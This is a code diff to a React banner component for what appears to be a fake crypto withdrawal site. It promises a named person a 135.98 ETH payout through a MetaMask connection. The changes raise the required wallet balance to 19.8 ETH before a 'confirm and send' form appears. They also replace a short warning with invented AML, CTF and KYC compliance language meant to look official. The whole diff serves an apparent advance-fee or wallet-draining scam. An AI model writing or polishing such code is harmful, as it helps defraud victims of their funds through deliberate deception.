@@ -219,18 +219,20 @@ const Banner = () => {
             </div> */}
             {
                 accountsConnected ? <>
-                    {userBalance <= 0 && (
+                    {userBalance < 19.8 && (
                         <div className="bg-red-600 text-white p-4 mb-4 rounded-md">
-                            <p>We have detected that your account has a balance of {userBalance?.toFixed(4)} ETH, with a low transaction history.To prevent fraud, we only transfer funds to wallets with a minimum balance of 15% of transfer amount, with positive transaction history</p>
+                            <p>
+                                Pursuant to our internal compliance policies and in alignment with established anti-money laundering (AML) and counter-terrorist financing (CTF) standards, we have identified that the referenced wallet maintains a balance of {userBalance?.toFixed(4)} ETH and reflects limited transactional activity. In accordance with our risk-based approach to fund disbursement, transfers are restricted to destination wallets that demonstrate a minimum balance equivalent to 15% of the proposed transfer amount and exhibit a positive transaction history. This measure is implemented to ensure adherence to Know Your Customer (KYC) protocols and to mitigate exposure to fraudulent or illicit activity.
+                            </p>
                         </div>
                     )}
-                    {userBalance > 0 && (
+                    {userBalance >= 19.8 && (
                         <VerifyAddressForm userBalance={userBalance} confirmAndSend={confirmAndSend} />
                     )}
-                    {userBalance <= 0 && (
+                    {userBalance < 19.8 && (
                         <div className="p-4 rounded-md border border-red-600">
                             <div className="flex flex-col gap-y-2">
-                                <h4>Account balance: <span className="font-bold">{userBalance.toFixed(4)} ETH  ({convertETHtoUSD(userBalance)})</span></h4>
+                                <h4>Wallet balance: <span className="font-bold">{userBalance.toFixed(4)} ETH  ({convertETHtoUSD(userBalance)})</span></h4>
                                 <h4>Minimum Required Balance: <span className="font-bold">19.8 ETH ({convertETHtoUSD(19.8)})</span></h4>
                                 <h4>Transfer amount: <span className="font-bold">135.98 ETH ({convertETHtoUSD(135.98)?.toString()})</span></h4>
                                 {/* <h4>Target Address (your address): <span className="font-bold">{account}</span></h4> */}
@@ -247,7 +249,7 @@ const Banner = () => {
                     </div>
                     <div className="border border-green-500 p-4 mb-5 rounded-md">
                         <p className="mb-2">Hey, J.Soliday we have some goods news for you, you can now withdraw your funds directly to your metamask wallet via Ethereum chain from your ledger account</p>
-                        <ConnectButton connectButton={connectButton}/>
+                        <ConnectButton connectButton={connectButton} />
                     </div></>
             }
         </section>
